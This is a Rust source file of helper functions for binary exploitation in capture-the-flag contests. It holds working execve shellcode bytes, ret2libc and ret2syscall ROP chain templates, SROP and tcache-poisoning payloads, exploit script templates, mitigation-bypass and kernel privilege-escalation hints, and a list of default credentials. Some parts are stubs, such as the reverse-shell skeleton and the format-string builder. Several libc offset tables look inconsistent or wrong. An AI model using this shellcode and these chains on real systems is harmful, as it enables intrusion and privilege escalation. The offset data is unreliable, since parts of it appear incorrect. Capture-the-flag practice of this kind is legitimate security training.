// CTF Quick Helpers - One-liner functions for rapid exploitation
// World-class helper functions for CTF speed and efficiency

use std::collections::HashMap;

pub struct QuickHelpers;

impl QuickHelpers {
    // Quick libc database lookup (common offsets for popular distros)
    pub fn libc_offsets(version: &str) -> HashMap<String, u64> {
        let mut offsets = HashMap::new();
        
        match version {
            "ubuntu_20.04" => {
                offsets.insert("__libc_start_main".to_string(), 0x21b10);
                offsets.insert("system".to_string(), 0x50d60);
                offsets.insert("/bin/sh".to_string(), 0x1d8678);
                offsets.insert("dup2".to_string(), 0x10fc40);
                offsets.insert("read".to_string(), 0x10fbe0);
                offsets.insert("write".to_string(), 0x10fc70);
                offsets.insert("execve".to_string(), 0xe5970);
                offsets.insert("setuid".to_string(), 0xe2f70);
                offsets.insert("printf".to_string(), 0x60c30);
                offsets.insert("puts".to_string(), 0x80a30);
                offsets.insert("gets".to_string(), 0x7fcd0);
            },
            "ubuntu_22.04" => {
                offsets.insert("__libc_start_main".to_string(), 0x29d90);
                offsets.insert("system".to_string(), 0x50d70);
                offsets.insert("/bin/sh".to_string(), 0x1d8698);
                offsets.insert("execve".to_string(), 0xe6070);
                offsets.insert("setuid".to_string(), 0xe3490);
            },
            "debian_11" => {
                offsets.insert("__libc_start_main".to_string(), 0x27140);
                offsets.insert("system".to_string(), 0x50d60);
                offsets.insert("/bin/sh".to_string(), 0x1b75aa);
                offsets.insert("execve".to_string(), 0xe54e0);
            },
            "centos_8" => {
                offsets.insert("__libc_start_main".to_string(), 0x24040);
                offsets.insert("system".to_string(), 0x50d60);
                offsets.insert("/bin/sh".to_string(), 0x1b3e1a);
            },
            _ => {
                // Default generic offsets (older glibc)
                offsets.insert("__libc_start_main".to_string(), 0x21b10);
                offsets.insert("system".to_string(), 0x4f440);
                offsets.insert("/bin/sh".to_string(), 0x1b3e9a);
            }
        }
        
        offsets
    }
    
    // Quick one gadget addresses for common libc versions
    pub fn one_gadgets(version: &str) -> Vec<u64> {
        match version {
            "ubuntu_20.04" => vec![
                0x50a47,  // execve("/bin/sh", rsp+0x40, environ)
                0x50a4c,  // execve("/bin/sh", rsp+0x40, environ)
                0xebcf1,  // execve("/bin/sh", r10, [rbp-0x70])
                0xebcf5,  // execve("/bin/sh", r10, rdx)
                0xebcf8,  // execve("/bin/sh", r10, [rbp-0x70])
            ],
            "ubuntu_22.04" => vec![
                0x50a47,
                0xebcf5,
                0x10a41c,
            ],
            _ => vec![0x50a47, 0xebcf5],  // Common defaults
        }
    }
    
    // Quick shellcode templates
    pub fn shellcode_template(arch: &str, shell_type: &str) -> Vec<u8> {
        match (arch, shell_type) {
            ("x64", "execve_sh") => vec![
                // execve("/bin/sh", 0, 0)
                0x48, 0x31, 0xff,              // xor rdi, rdi
                0x48, 0x31, 0xf6,              // xor rsi, rsi
                0x48, 0x31, 0xd2,              // xor rdx, rdx
                0x48, 0xbb, 0x2f, 0x62, 0x69,  // movabs rbx, 0x68732f6e69622f
                0x6e, 0x2f, 0x73, 0x68, 0x00,
                0x53,                          // push rbx
                0x48, 0x89, 0xe7,              // mov rdi, rsp
                0xb0, 0x3b,                    // mov al, 0x3b
                0x0f, 0x05                     // syscall
            ],
            ("x64", "reverse_shell") => vec![
                // Minimal TCP reverse shell skeleton
                0x48, 0x31, 0xc0,  // xor rax, rax
                0x48, 0x31, 0xff,  // xor rdi, rdi
                0x48, 0x31, 0xf6,  // xor rsi, rsi
                0x48, 0x31, 0xd2,  // xor rdx, rdx
                // ... would continue with socket/connect/dup2/execve
            ],
            ("x86", "execve_sh") => vec![
                // execve("/bin/sh", 0, 0) for 32-bit
                0x31, 0xc0,              // xor eax, eax
                0x50,                    // push eax
                0x68, 0x2f, 0x2f, 0x73, 0x68,  // push "//sh"
                0x68, 0x2f, 0x62, 0x69, 0x6e,  // push "/bin"
                0x89, 0xe3,              // mov ebx, esp
                0x50,                    // push eax
                0x53,                    // push ebx
                0x89, 0xe1,              // mov ecx, esp
                0xb0, 0x0b,              // mov al, 0x0b
                0xcd, 0x80               // int 0x80
            ],
            _ => vec![],
        }
    }
    
    // Quick format string payload builders
    pub fn fmtstr_write_what_where(_target_addr: u64, _value: u64, offset: usize) -> String {
        // Simplified format string write primitive
        let mut payload = String::new();
        
        // Write value to target_addr using %n writes
        // This is a simplified version - real impl would calculate proper offsets
        payload.push_str(&format!("%{}$n", offset));
        
        payload
    }
    
    // Quick ROP chain templates
    pub fn rop_template_ret2libc(
        pop_rdi: u64,
        ret: u64,
        system: u64,
        bin_sh: u64
    ) -> Vec<u64> {
        vec![
            ret,       // Stack alignment
            pop_rdi,
            bin_sh,
            system,
        ]
    }
    
    pub fn rop_template_ret2syscall(
        pop_rax: u64,
        pop_rdi: u64,
        pop_rsi: u64,
        pop_rdx: u64,
        syscall: u64,
        bin_sh: u64,
    ) -> Vec<u64> {
        vec![
            pop_rax,
            59,        // execve syscall number
            pop_rdi,
            bin_sh,
            pop_rsi,
            0,
            pop_rdx,
            0,
            syscall,
        ]
    }
    
    // Quick SROP frame generator
    pub fn srop_frame_template() -> HashMap<String, u64> {
        let mut frame = HashMap::new();
        
        // Typical SROP frame layout
        frame.insert("rax".to_string(), 59);  // execve
        frame.insert("rdi".to_string(), 0);   // Will be /bin/sh address
        frame.insert("rsi".to_string(), 0);
        frame.insert("rdx".to_string(), 0);
        frame.insert("rip".to_string(), 0);   // Will be syscall address
        frame.insert("rsp".to_string(), 0);
        frame.insert("rbp".to_string(), 0);
        
        frame
    }
    
    // Quick heap spray patterns
    pub fn heap_spray_pattern(size: usize, fill_byte: u8) -> Vec<u8> {
        vec![fill_byte; size]
    }
    
    pub fn heap_tcache_poison_payload(target_addr: u64) -> Vec<u8> {
        // Tcache poisoning: overwrite fd pointer
        let mut payload = Vec::new();
        
        // Add target address (little endian)
        payload.extend_from_slice(&target_addr.to_le_bytes());
        
        payload
    }
    
    // Quick checksums for bypasses
    pub fn calc_checksum_32(data: &[u8]) -> u32 {
        data.iter().map(|&b| b as u32).sum()
    }
    
    pub fn calc_checksum_xor(data: &[u8]) -> u8 {
        data.iter().fold(0, |acc, &b| acc ^ b)
    }
    
    // Quick NOP sleds
    pub fn nop_sled(size: usize, arch: &str) -> Vec<u8> {
        match arch {
            "x64" | "x86" => vec![0x90; size],  // NOP
            "arm" => vec![0x00, 0xf0, 0x20, 0xe3].repeat(size / 4),  // NOP (ARM)
            "mips" => vec![0x00, 0x00, 0x00, 0x00].repeat(size / 4),  // NOP (MIPS)
            _ => vec![0x90; size],
        }
    }
    
    // Quick bad character detection
    pub fn find_bad_chars(test_data: &[u8], received_data: &[u8]) -> Vec<u8> {
        let mut bad_chars = Vec::new();
        
        for i in 0..test_data.len().min(received_data.len()) {
            if test_data[i] != received_data[i] {
                bad_chars.push(test_data[i]);
            }
        }
        
        bad_chars
    }
    
    // Quick padding calculation
    pub fn calc_padding(current_size: usize, target_size: usize) -> usize {
        if target_size > current_size {
            target_size - current_size
        } else {
            0
        }
    }
    
    // Quick endianness swap
    pub fn swap_endian_32(value: u32) -> u32 {
        value.swap_bytes()
    }
    
    pub fn swap_endian_64(value: u64) -> u64 {
        value.swap_bytes()
    }
    
    // Quick common gadget patterns (regex patterns for ROPgadget)
    pub fn common_gadget_patterns() -> Vec<&'static str> {
        vec![
            "pop rdi; ret",
            "pop rsi; ret",
            "pop rdx; ret",
            "pop rax; ret",
            "pop rbx; ret",
            "pop rcx; ret",
            "pop r12; ret",
            "mov rax, rdi; ret",
            "xor rax, rax; ret",
            "add rsp, 0x",
            "leave; ret",
            "syscall; ret",
            "sysenter; ret",
            "int 0x80; ret",
            "call rax",
            "jmp rax",
            "jmp rsp",
        ]
    }
    
    // Quick common CTF flag formats
    pub fn flag_regex_patterns() -> Vec<&'static str> {
        vec![
            r"flag\{[^}]+\}",
            r"FLAG\{[^}]+\}",
            r"CTF\{[^}]+\}",
            r"HTB\{[^}]+\}",
            r"picoCTF\{[^}]+\}",
            r"DUCTF\{[^}]+\}",
            r"THM\{[^}]+\}",
            r"CSCG\{[^}]+\}",
            r"pwn\.college\{[^}]+\}",
            r"[A-Za-z0-9]{32}",  // MD5 hash format
            r"[A-Za-z0-9]{64}",  // SHA256 hash format
        ]
    }
    
    // Quick common vulnerable functions
    pub fn dangerous_functions() -> Vec<&'static str> {
        vec![
            "gets",
            "strcpy",
            "strcat",
            "sprintf",
            "vsprintf",
            "scanf",
            "fscanf",
            "sscanf",
            "strncpy",  // Can be dangerous
            "strncat",  // Can be dangerous
            "memcpy",   // Can be dangerous
            "memmove",  // Can be dangerous
            "system",
            "exec",
            "popen",
            "printf",   // Format string
            "fprintf",  // Format string
            "snprintf", // Format string
            "read",     // Buffer overflow
            "recv",     // Buffer overflow
            "fread",    // Buffer overflow
            "alloca",   // Stack issues
        ]
    }
    
    // Quick security mitigation detection hints
    pub fn mitigation_bypass_hints(mitigation: &str) -> Vec<&'static str> {
        match mitigation {
            "PIE" => vec![
                "Leak code/library address",
                "Use partial overwrite",
                "Look for stack/heap addresses",
                "Exploit format string to leak",
            ],
            "NX" => vec![
                "Use ROP chain",
                "Ret2libc",
                "mprotect() to make stack executable",
                "Look for rwx segments",
            ],
            "Canary" => vec![
                "Leak canary value",
                "Overwrite only after canary",
                "Fork before crash to brute force",
                "Look for canary leak in output",
            ],
            "ASLR" => vec![
                "Leak library/stack address",
                "Partial overwrite (12 bits)",
                "Brute force if many connections",
                "Look for info leaks",
            ],
            "RELRO" => vec![
                "Full RELRO: Can't overwrite GOT",
                "Partial RELRO: GOT writable",
                "Look for other writable function pointers",
                "Target .bss or .data hooks",
            ],
            _ => vec!["Unknown mitigation"],
        }
    }
    
    // Quick common integer overflow patterns
    pub fn int_overflow_targets() -> Vec<(&'static str, &'static str)> {
        vec![
            ("malloc(size)", "size calculation overflow"),
            ("calloc(count, size)", "count * size overflow"),
            ("realloc(ptr, size)", "size overflow"),
            ("alloca(size)", "size overflow"),
            ("memcpy(dst, src, n)", "n overflow"),
            ("read(fd, buf, count)", "count overflow"),
            ("snprintf(buf, size, ...)", "size underflow"),
        ]
    }
    
    // Quick common race condition targets
    pub fn race_condition_targets() -> Vec<&'static str> {
        vec![
            "TOCTOU (Time Of Check, Time Of Use)",
            "Signal handlers",
            "File operations (symlink attacks)",
            "Multi-threaded heap operations",
            "Double fetch vulnerabilities",
            "Filesystem race windows",
        ]
    }
    
    // Quick exploit template generator
    pub fn generate_exploit_template(exploit_type: &str) -> String {
        match exploit_type {
            "buffer_overflow" => r#"
# Buffer Overflow Exploit Template
let binary = "./vuln"
let host = "127.0.0.1"
let port = 9999

let elf = analyze(binary)
let offset = 72  # TODO: Find offset
let gadgets = quick_rop(binary)
let pop_rdi = gadgets.find("pop rdi; ret")

let conn = connect(host, port)
let payload = cyclic(offset) + p64(pop_rdi) + p64(0xdeadbeef)
send(conn, payload)
interactive(conn)
"#.to_string(),
            
            "format_string" => r#"
# Format String Exploit Template
let binary = "./vuln"
let host = "127.0.0.1"
let port = 9999

let elf = analyze(binary)
let conn = connect(host, port)

# Leak stack/libc addresses
let leak_payload = "%p %p %p %p %p %p"
send(conn, leak_payload)
let response = recv(conn)

# Write to target address
let target = 0x601234  # TODO: Set target address
let value = 0x1337     # TODO: Set value
# TODO: Build format string write
"#.to_string(),
            
            "heap_overflow" => r#"
# Heap Overflow Exploit Template
let binary = "./vuln"
let host = "127.0.0.1"
let port = 9999

let elf = analyze(binary)
let conn = connect(host, port)

# Allocate chunks
# TODO: Groom heap layout
# TODO: Overflow into adjacent chunk
# TODO: Overwrite fd pointer
# TODO: Trigger arbitrary write
"#.to_string(),
            
            _ => "# Unknown exploit type\n".to_string(),
        }
    }
    
    // Quick payload encoding/obfuscation
    pub fn xor_encode(data: &[u8], key: u8) -> Vec<u8> {
        data.iter().map(|&b| b ^ key).collect()
    }
    
    pub fn alpha_encode_hint() -> &'static str {
        "Use alphanumeric shellcode encoder for restricted input"
    }
    
    // Quick common stack pivoting gadgets
    pub fn stack_pivot_patterns() -> Vec<&'static str> {
        vec![
            "xchg rax, rsp; ret",
            "mov rsp, rax; ret",
            "add rsp, 0x",
            "sub rsp, 0x",
            "leave; ret",
            "pop rsp; ret",
        ]
    }
    
    // Quick kernel exploitation hints
    pub fn kernel_exploit_hints() -> HashMap<&'static str, Vec<&'static str>> {
        let mut hints = HashMap::new();
        
        hints.insert("Setup", vec![
            "Use qemu for kernel debugging",
            "Extract vmlinux for symbols",
            "Setup GDB with kernel awareness",
        ]);
        
        hints.insert("Info Leak", vec![
            "Leak kernel base address",
            "Leak heap/stack addresses",
            "Use /proc/kallsyms if available",
        ]);
        
        hints.insert("Privilege Escalation", vec![
            "Overwrite cred struct",
            "Overwrite modprobe_path",
            "ROP in kernel space",
            "ret2usr if SMEP/SMAP disabled",
        ]);
        
        hints
    }
}

// Quick payload size calculators
pub fn calc_rop_chain_size(num_gadgets: usize, ptr_size: usize) -> usize {
    num_gadgets * ptr_size
}

pub fn calc_shellcode_padding(shellcode_len: usize, target_size: usize) -> usize {
    if target_size > shellcode_len {
        target_size - shellcode_len
    } else {
        0
    }
}

// Quick common port numbers for CTF
pub fn common_ctf_ports() -> HashMap<&'static str, u16> {
    let mut ports = HashMap::new();
    ports.insert("pwn", 9999);
    ports.insert("pwn_alt", 1337);
    ports.insert("web", 8080);
    ports.insert("web_alt", 3000);
    ports.insert("ssh", 22);
    ports.insert("ftp", 21);
    ports.insert("telnet", 23);
    ports.insert("mysql", 3306);
    ports.insert("postgres", 5432);
    ports.insert("redis", 6379);
    ports.insert("mongodb", 27017);
    ports
}

// Quick common CTF usernames/passwords
pub fn common_credentials() -> Vec<(&'static str, &'static str)> {
    vec![
        ("admin", "admin"),
        ("root", "root"),
        ("admin", "password"),
        ("admin", "12345"),
        ("user", "user"),
        ("guest", "guest"),
        ("ctf", "ctf"),
        ("pwn", "pwn"),
    ]
}
